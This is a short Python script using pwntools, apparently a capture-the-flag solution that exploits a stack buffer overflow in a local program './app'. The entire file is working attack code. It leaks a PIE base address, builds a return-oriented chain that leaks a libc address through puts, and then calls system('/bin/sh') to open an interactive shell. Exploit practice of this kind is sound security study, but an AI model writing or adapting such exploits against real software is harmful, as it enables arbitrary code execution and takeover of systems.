#!/usr/bin/env python3
from pwn import *

exe = ELF('./app')
libc = ELF('./libc.so.6')

io = process('./app')

io.sendlineafter(b"name?", b"admin" + b"A"*99)
io.recvuntil(b"A"*99)
pieBase = u64(io.recvline().strip()[:-1].ljust(8, b"\x00")) - exe.symbols['admin_func']

payload  = b""
payload += b"A"*120
payload += p64(pieBase + 0x1323)
payload += p64(pieBase + exe.got['printf'])
payload += p64(pieBase + exe.plt['puts'])
payload += p64(pieBase + exe.symbols['main'])

io.sendlineafter(b"name?", payload)
io.recvuntil(b"bye!\n")
libcBase = u64(io.recvline().strip().ljust(8, b"\x00")) - libc.symbols['printf']

payload  = b""
payload += b"A"*120
payload += p64(pieBase + 0x1323)
payload += p64(libcBase + next(libc.search(b'/bin/sh\x00')))
payload += p64(pieBase + 0x101a)
payload += p64(libcBase + libc.symbols['system'])

io.sendlineafter(b"name?", payload)
io.interactive()
